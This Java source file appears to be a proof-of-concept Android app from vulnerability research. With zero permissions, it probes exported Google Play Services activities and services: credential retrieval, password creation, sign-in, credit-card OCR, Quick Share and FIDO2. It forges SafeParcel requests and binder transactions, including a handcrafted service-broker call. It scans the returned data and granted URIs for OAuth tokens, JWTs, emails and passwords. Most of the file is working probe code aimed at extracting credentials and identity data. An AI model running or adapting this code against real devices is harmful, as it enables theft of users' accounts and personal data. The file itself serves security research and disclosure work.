package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class GmsDeepProbeActivity extends Activity {
    private static final String T = "GMSDEEP";

    private static final int RC_CREDENTIAL = 4001;
    private static final int RC_ADDRESS = 4002;
    private static final int RC_CREDIT_OCR = 4003;
    private static final int RC_QUICKSHARE_RECV = 4004;
    private static final int RC_QUICKSHARE_SEND = 4005;
    private static final int RC_SIGNIN = 4006;
    private static final int RC_PASSWORD = 4007;
    private static final int RC_INTRUSION = 4008;
    private static final int RC_FIDO2 = 4009;
    private static final int RC_MIRRORING = 4010;
    private static final int RC_PEOPLE_SETTINGS = 4011;
    private static final int RC_REMOTE_COPY = 4012;

    private int testIndex = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== GMS Deep Probe — Credential/Identity/QuickShare ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());
        Log.w(T, "ZERO PERMISSIONS — testing exported GMS activities");
        runNextTest();
    }

    private void runNextTest() {
        testIndex++;
        switch (testIndex) {
            case 1: testGetCredential(); break;
            case 2: testCreatePassword(); break;
            case 3: testRequestUserAddress(); break;
            case 4: testCreditCardOcr(); break;
            case 5: testQuickShareReceive(); break;
            case 6: testQuickShareSend(); break;
            case 7: testGoogleSignIn(); break;
            case 8: testIntrusionRetrieval(); break;
            case 9: testFido2(); break;
            case 10: testScreenMirroring(); break;
            case 11: testPeopleSettings(); break;
            case 12: testRemoteCopy(); break;
            case 13: testNearbyServices(); break;
            default:
                Log.w(T, "=== ALL GMS DEEP PROBES COMPLETE ===");
                finish();
                break;
        }
    }

    private void testGetCredential() {
        Log.w(T, "--- [1] GET_CREDENTIAL: Credential Manager ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.api.credentials.GET_CREDENTIAL");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.nextgen.ui.GetVerifiableCredentialActivity"));

            byte[] request = buildGetCredentialRequest();
            intent.putExtra("get_credential_request", request);
            startActivityForResult(intent, RC_CREDENTIAL);
        } catch (Exception e) {
            Log.e(T, "GET_CREDENTIAL failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testCreatePassword() {
        Log.w(T, "--- [2] CREATE_PASSWORD_CREDENTIAL ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.api.credentials.CREATE_PASSWORD_CREDENTIAL");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.credman.create.CreatePasswordActivity"));

            byte[] request = buildCreatePasswordRequest("victim@example.com", "password123");
            intent.putExtra("create_credential_request", request);
            startActivityForResult(intent, RC_PASSWORD);
        } catch (Exception e) {
            Log.e(T, "CREATE_PASSWORD failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testRequestUserAddress() {
        Log.w(T, "--- [3] REQUEST_USER_ADDRESS ---");
        try {
            Intent intent = new Intent("com.google.android.gms.identity.REQUEST_USER_ADDRESS");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.wallet.ow.ChooseAccountShimInternalActivity"));
            startActivityForResult(intent, RC_ADDRESS);
        } catch (Exception e) {
            Log.e(T, "REQUEST_USER_ADDRESS failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testCreditCardOcr() {
        Log.w(T, "--- [4] CREDIT_CARD_OCR ---");
        try {
            Intent intent = new Intent("com.google.android.gms.ocr.ACTION_CREDIT_CARD_OCR");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.ocr.SecuredCreditCardOcrActivity"));
            startActivityForResult(intent, RC_CREDIT_OCR);
        } catch (Exception e) {
            Log.e(T, "CREDIT_CARD_OCR failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testQuickShareReceive() {
        Log.w(T, "--- [5] RECEIVE_NEARBY / QUICK_SHARE ---");
        try {
            Intent intent = new Intent("com.google.android.gms.nearby.QUICK_SHARE");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.migration.TransparentTrampolineActivity"));
            intent.setType("*/*");
            startActivityForResult(intent, RC_QUICKSHARE_RECV);
        } catch (Exception e) {
            Log.e(T, "QUICK_SHARE failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testQuickShareSend() {
        Log.w(T, "--- [6] SHARE_NEARBY ---");
        try {
            Intent intent = new Intent("com.google.android.gms.SHARE_NEARBY");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.migration.TransparentTrampolineActivity"));
            intent.setType("text/plain");
            intent.putExtra(Intent.EXTRA_TEXT, "PoC test data from zero-perm app");
            startActivityForResult(intent, RC_QUICKSHARE_SEND);
        } catch (Exception e) {
            Log.e(T, "SHARE_NEARBY failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testGoogleSignIn() {
        Log.w(T, "--- [7] GOOGLE_SIGN_IN ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.GOOGLE_SIGN_IN");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.signin.ui.SignInActivity"));

            byte[] signInConfig = buildSignInConfig();
            intent.putExtra("config", signInConfig);
            startActivityForResult(intent, RC_SIGNIN);
        } catch (Exception e) {
            Log.e(T, "GOOGLE_SIGN_IN failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testIntrusionRetrieval() {
        Log.w(T, "--- [8] INTRUSION_DETECTION RETRIEVAL ---");
        try {
            Intent intent = new Intent("com.google.android.gms.intrusiondetection.RETRIEVAL");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.intrusiondetection.ui.retrieval.IntrusionDetectionRetrievalActivity"));
            startActivityForResult(intent, RC_INTRUSION);
        } catch (Exception e) {
            Log.e(T, "INTRUSION_RETRIEVAL failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testFido2() {
        Log.w(T, "--- [9] FIDO2 Authenticate ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.fido.fido2.ui.Fido2FullScreenActivity"));
            startActivityForResult(intent, RC_FIDO2);
        } catch (Exception e) {
            Log.e(T, "FIDO2 failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testScreenMirroring() {
        Log.w(T, "--- [10] SCREEN MIRRORING ---");
        try {
            Intent intent = new Intent("com.google.android.gms.cast.mirroring.receiver.ACTION_START_MIRRORING");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.cast.mirroring.receiver.MirroringActivity"));
            startActivityForResult(intent, RC_MIRRORING);
        } catch (Exception e) {
            Log.e(T, "MIRRORING failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testPeopleSettings() {
        Log.w(T, "--- [11] PEOPLE INTERNAL_SETTINGS ---");
        try {
            Intent intent = new Intent("com.google.android.gms.people.settings.INTERNAL_SETTINGS");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.people.settings.PeopleInternalSettingsActivity"));
            startActivityForResult(intent, RC_PEOPLE_SETTINGS);
        } catch (Exception e) {
            Log.e(T, "PEOPLE_SETTINGS failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testRemoteCopy() {
        Log.w(T, "--- [12] REMOTE_COPY ---");
        try {
            Intent intent = new Intent("android.intent.action.REMOTE_COPY");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.nearby.sharing.RemoteCopyShareSheetActivity"));
            intent.setType("text/plain");
            intent.putExtra(Intent.EXTRA_TEXT, "PoC clipboard injection");
            startActivityForResult(intent, RC_REMOTE_COPY);
        } catch (Exception e) {
            Log.e(T, "REMOTE_COPY failed: " + e.getMessage());
            runNextTest();
        }
    }

    private void testNearbyServices() {
        Log.w(T, "--- [13] NEARBY SERVICES BIND PROBE ---");
        String[][] services = {
            {"com.google.android.gms.nearby.bootstrap.service.NearbyBootstrapService.START", "NearbyBootstrap"},
            {"com.google.android.gms.nearby.messages.service.NearbyMessagesService.START", "NearbyMessages"},
        };

        for (String[] svc : services) {
            try {
                Intent intent = new Intent(svc[0]);
                intent.setPackage("com.google.android.gms");
                boolean bound = bindService(intent, new ServiceConnection() {
                    public void onServiceConnected(ComponentName name, IBinder service) {
                        Log.w(T, "[+] BOUND: " + svc[1] + " iface=" + getDesc(service));
                        probeServiceBinder(service, svc[1]);
                        try { unbindService(this); } catch (Exception e) {}
                    }
                    public void onServiceDisconnected(ComponentName name) {}
                }, Context.BIND_AUTO_CREATE);
                Log.w(T, svc[1] + " bind=" + bound);
            } catch (Exception e) {
                Log.w(T, svc[1] + " error: " + e.getMessage());
            }
        }

        new android.os.Handler().postDelayed(new Runnable() {
            public void run() { runNextTest(); }
        }, 3000);
    }

    private String getDesc(IBinder b) {
        try { return b.getInterfaceDescriptor(); } catch (Exception e) { return "?"; }
    }

    private void probeServiceBinder(IBinder service, String label) {
        new Thread(new Runnable() {
            public void run() {
                String desc = getDesc(service);
                Log.w(T, "[*] " + label + " descriptor=" + desc);

                if (desc != null && desc.contains("IGmsServiceBroker")) {
                    Log.w(T, "[*] " + label + " is IGmsServiceBroker — trying getService...");
                    tryGetService(service, label);
                } else {
                    for (int tx = 1; tx <= 10; tx++) {
                        try {
                            Parcel d = Parcel.obtain();
                            Parcel r = Parcel.obtain();
                            if (desc != null) d.writeInterfaceToken(desc);
                            boolean res = service.transact(tx, d, r, 0);
                            if (r.dataSize() > 0) {
                                r.setDataPosition(0);
                                int exCode = r.readInt();
                                if (exCode == 0 && r.dataAvail() > 0) {
                                    Log.w(T, "[+] " + label + " TX" + tx + " SUCCESS avail=" + r.dataAvail());
                                    dumpParcel(r, label + " TX" + tx, 128);
                                } else if (exCode != 0) {
                                    String msg = safeReadString(r);
                                    Log.w(T, "[*] " + label + " TX" + tx + " exc=" + exCode + " " + trunc(msg, 80));
                                }
                            }
                            d.recycle();
                            r.recycle();
                        } catch (Exception e) {
                            if (tx <= 3) Log.w(T, "[*] " + label + " TX" + tx + ": " + e.getMessage());
                        }
                    }
                }
            }
        }).start();
    }

    private void tryGetService(IBinder broker, String label) {
        try {
            Parcel d = Parcel.obtain();
            Parcel r = Parcel.obtain();
            d.writeInterfaceToken("com.google.android.gms.common.internal.IGmsServiceBroker");

            d.writeInt(46);  // service ID — try various IDs

            // GetServiceRequest SafeParcel
            d.writeInt(0xFFFF4F45); // begin marker
            int sizePos = d.dataPosition();
            d.writeInt(0);
            int start = d.dataPosition();

            // field 1: version = 4
            d.writeInt((4 << 16) | 1);
            d.writeInt(4);

            // field 2: clientVersion
            d.writeInt((4 << 16) | 2);
            d.writeInt(12451000);

            // field 3: package name
            d.writeInt((0xFFFF << 16) | 3);
            int f3sp = d.dataPosition();
            d.writeInt(0);
            int f3s = d.dataPosition();
            d.writeString(getPackageName());
            int f3e = d.dataPosition();
            d.setDataPosition(f3sp);
            d.writeInt(f3e - f3s);
            d.setDataPosition(f3e);

            int end = d.dataPosition();
            d.setDataPosition(sizePos);
            d.writeInt(end - start);
            d.setDataPosition(end);

            // Callback binder
            CountDownLatch latch = new CountDownLatch(1);
            IBinder cb = new Binder() {
                @Override
                protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                    Log.w(T, "[CB] " + label + " getService callback code=" + code + " size=" + data.dataSize());
                    data.setDataPosition(0);
                    dumpParcel(data, label + " CB", 256);

                    // Try extracting service binder
                    try {
                        data.setDataPosition(0);
                        for (int off = 0; off < data.dataSize() - 4; off += 4) {
                            data.setDataPosition(off);
                            try {
                                IBinder svc = data.readStrongBinder();
                                if (svc != null) {
                                    String sDesc = getDesc(svc);
                                    Log.w(T, "[!!!] " + label + " GOT SERVICE BINDER at off=" + off + " desc=" + sDesc);
                                }
                            } catch (Exception e) {}
                        }
                    } catch (Exception e) {}
                    latch.countDown();
                    return true;
                }
            };
            d.writeStrongBinder(cb);

            broker.transact(46, d, r, 0);
            if (r.dataSize() > 0) {
                r.setDataPosition(0);
                Log.w(T, "[*] " + label + " getService sync reply size=" + r.dataSize());
                dumpParcel(r, label + " getService reply", 128);
            }
            d.recycle();
            r.recycle();

            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.w(T, "[*] " + label + " getService error: " + e.getMessage());
        }
    }

    // SafeParcel builders

    private byte[] buildGetCredentialRequest() {
        Parcel p = Parcel.obtain();
        p.writeInt(0xFFFF4F45);
        int sizePos = p.dataPosition();
        p.writeInt(0);
        int start = p.dataPosition();

        // field 1: credential type = "android.credentials.TYPE_PASSWORD_CREDENTIAL"
        writeStringField(p, 1, "android.credentials.TYPE_PASSWORD_CREDENTIAL");
        // field 2: requesting package
        writeStringField(p, 2, getPackageName());

        int end = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(end - start);
        p.setDataPosition(end);
        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    private byte[] buildCreatePasswordRequest(String username, String password) {
        Parcel p = Parcel.obtain();
        p.writeInt(0xFFFF4F45);
        int sizePos = p.dataPosition();
        p.writeInt(0);
        int start = p.dataPosition();

        writeStringField(p, 1, username);
        writeStringField(p, 2, password);
        writeStringField(p, 3, getPackageName());

        int end = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(end - start);
        p.setDataPosition(end);
        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    private byte[] buildSignInConfig() {
        Parcel p = Parcel.obtain();
        p.writeInt(0xFFFF4F45);
        int sizePos = p.dataPosition();
        p.writeInt(0);
        int start = p.dataPosition();

        // Request email and profile
        writeBoolField(p, 3, true); // requestEmail
        writeBoolField(p, 4, true); // requestProfile
        writeBoolField(p, 5, true); // requestIdToken

        int end = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(end - start);
        p.setDataPosition(end);
        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    // Parcel helpers

    private void writeStringField(Parcel p, int fieldId, String value) {
        if (value == null) return;
        p.writeInt((0xFFFF << 16) | fieldId);
        int sizePos = p.dataPosition();
        p.writeInt(0);
        int start = p.dataPosition();
        p.writeString(value);
        int end = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(end - start);
        p.setDataPosition(end);
    }

    private void writeBoolField(Parcel p, int fieldId, boolean value) {
        p.writeInt((4 << 16) | fieldId);
        p.writeInt(value ? 1 : 0);
    }

    private void dumpParcel(Parcel p, String label, int maxBytes) {
        int pos = p.dataPosition();
        byte[] raw;
        try {
            p.setDataPosition(0);
            raw = p.marshall();
        } catch (Exception e) {
            raw = new byte[0];
        }
        p.setDataPosition(pos);

        StringBuilder hex = new StringBuilder();
        for (int i = 0; i < Math.min(raw.length, maxBytes); i++) {
            hex.append(String.format("%02x", raw[i]));
            if ((i + 1) % 4 == 0) hex.append(" ");
        }
        Log.w(T, label + " HEX(" + raw.length + "): " + hex.toString());

        // Extract readable strings
        StringBuilder ascii = new StringBuilder();
        for (byte b : raw) {
            if (b >= 32 && b < 127) ascii.append((char) b);
            else if (ascii.length() > 0) {
                if (ascii.length() >= 4) Log.w(T, label + " STR: " + ascii.toString());
                ascii.setLength(0);
            }
        }
        if (ascii.length() >= 4) Log.w(T, label + " STR: " + ascii.toString());
    }

    private String safeReadString(Parcel p) {
        try { return p.readString(); } catch (Exception e) { return null; }
    }

    private String trunc(String s, int max) {
        if (s == null) return "";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        String target;
        switch (requestCode) {
            case RC_CREDENTIAL: target = "GET_CREDENTIAL"; break;
            case RC_PASSWORD: target = "CREATE_PASSWORD"; break;
            case RC_ADDRESS: target = "USER_ADDRESS"; break;
            case RC_CREDIT_OCR: target = "CREDIT_CARD_OCR"; break;
            case RC_QUICKSHARE_RECV: target = "QUICKSHARE_RECV"; break;
            case RC_QUICKSHARE_SEND: target = "QUICKSHARE_SEND"; break;
            case RC_SIGNIN: target = "GOOGLE_SIGN_IN"; break;
            case RC_INTRUSION: target = "INTRUSION_RETRIEVAL"; break;
            case RC_FIDO2: target = "FIDO2"; break;
            case RC_MIRRORING: target = "MIRRORING"; break;
            case RC_PEOPLE_SETTINGS: target = "PEOPLE_SETTINGS"; break;
            case RC_REMOTE_COPY: target = "REMOTE_COPY"; break;
            default: target = "UNKNOWN_" + requestCode; break;
        }

        Log.w(T, "=== RESULT: " + target + " ===");
        Log.w(T, "resultCode=" + resultCode + " (OK=" + RESULT_OK + " CANCEL=" + RESULT_CANCELED + ")");

        if (data != null) {
            Log.w(T, "*** DATA RETURNED FROM " + target + " ***");
            if (data.getAction() != null) Log.w(T, "  action=" + data.getAction());
            if (data.getData() != null) Log.w(T, "  data=" + data.getData());
            if (data.getType() != null) Log.w(T, "  type=" + data.getType());

            Bundle extras = data.getExtras();
            if (extras != null) {
                Log.w(T, "  EXTRAS (count=" + extras.size() + "):");
                for (String key : extras.keySet()) {
                    Object val = extras.get(key);
                    if (val == null) continue;
                    String type = val.getClass().getSimpleName();
                    Log.w(T, "    KEY=" + key + " TYPE=" + type);

                    if (val instanceof byte[]) {
                        byte[] bytes = (byte[]) val;
                        Log.w(T, "    BYTES_LEN=" + bytes.length);
                        Parcel bp = Parcel.obtain();
                        bp.unmarshall(bytes, 0, bytes.length);
                        bp.setDataPosition(0);
                        dumpParcel(bp, "    " + key, 256);
                        bp.recycle();
                        extractSafeParcelStrings(bytes, key);
                    } else if (val instanceof Intent) {
                        Intent nested = (Intent) val;
                        Log.w(T, "    NESTED_INTENT action=" + nested.getAction()
                            + " data=" + nested.getData() + " comp=" + nested.getComponent());
                        if (nested.getExtras() != null) {
                            for (String nk : nested.getExtras().keySet()) {
                                Object nv = nested.getExtras().get(nk);
                                Log.w(T, "      NESTED_KEY=" + nk + " VAL=" + trunc(String.valueOf(nv), 200));
                            }
                        }
                    } else {
                        String valStr = String.valueOf(val);
                        Log.w(T, "    VALUE=" + trunc(valStr, 300));
                        if (valStr.contains("token") || valStr.contains("auth") ||
                            valStr.contains("email") || valStr.contains("@") ||
                            valStr.contains("credential") || valStr.contains("password")) {
                            Log.w(T, "    [!!!] SENSITIVE DATA DETECTED IN " + target + "." + key);
                        }
                    }
                }
            }

            if (data.getClipData() != null) {
                Log.w(T, "  CLIP_DATA items=" + data.getClipData().getItemCount());
                for (int i = 0; i < data.getClipData().getItemCount(); i++) {
                    Uri clipUri = data.getClipData().getItemAt(i).getUri();
                    CharSequence clipText = data.getClipData().getItemAt(i).getText();
                    Log.w(T, "    CLIP[" + i + "] uri=" + clipUri + " text=" + clipText);
                    if (clipUri != null) {
                        Log.w(T, "    [!!!] URI GRANT in " + target + ": " + clipUri);
                        tryReadUri(clipUri);
                    }
                }
            }
        } else {
            Log.w(T, "No data returned from " + target);
        }

        runNextTest();
    }

    private void tryReadUri(Uri uri) {
        try {
            ContentResolver cr = getContentResolver();
            java.io.InputStream is = cr.openInputStream(uri);
            if (is != null) {
                byte[] buf = new byte[4096];
                int read = is.read(buf);
                is.close();
                if (read > 0) {
                    String content = new String(buf, 0, Math.min(read, 500));
                    Log.w(T, "    [!!!] URI CONTENT (" + read + " bytes): " + content);
                }
            }
        } catch (Exception e) {
            Log.w(T, "    URI read failed: " + e.getMessage());
        }
    }

    private void extractSafeParcelStrings(byte[] bytes, String label) {
        try {
            Parcel p = Parcel.obtain();
            p.unmarshall(bytes, 0, bytes.length);
            p.setDataPosition(0);

            int magic = p.readInt();
            if (magic != 0xFFFF4F45) { p.recycle(); return; }

            int totalSize = p.readInt();
            int end = Math.min(p.dataPosition() + totalSize, bytes.length);

            while (p.dataPosition() < end && p.dataAvail() >= 4) {
                int header = p.readInt();
                int fieldId = header & 0xFFFF;
                int dataSize = (header >> 16) & 0xFFFF;
                if (dataSize == 0xFFFF) dataSize = p.readInt();
                int fieldEnd = p.dataPosition() + dataSize;

                if (dataSize > 8 && dataSize < 2000) {
                    int savedPos = p.dataPosition();
                    try {
                        String s = p.readString();
                        if (s != null && s.length() > 2) {
                            Log.w(T, "    SP." + label + " field" + fieldId + "=\"" + trunc(s, 200) + "\"");
                            if (s.contains("@") || s.contains("token") || s.contains("ya29.") ||
                                s.contains("eyJ") || s.length() > 50) {
                                Log.w(T, "    [!!!] POTENTIAL SENSITIVE DATA in field " + fieldId);
                            }
                        }
                    } catch (Exception e) {}
                    p.setDataPosition(savedPos);
                } else if (dataSize == 4) {
                    int intVal = p.readInt();
                    if (intVal != 0) Log.w(T, "    SP." + label + " field" + fieldId + "=" + intVal);
                }
                p.setDataPosition(Math.min(fieldEnd, bytes.length));
            }
            p.recycle();
        } catch (Exception e) {}
    }
}
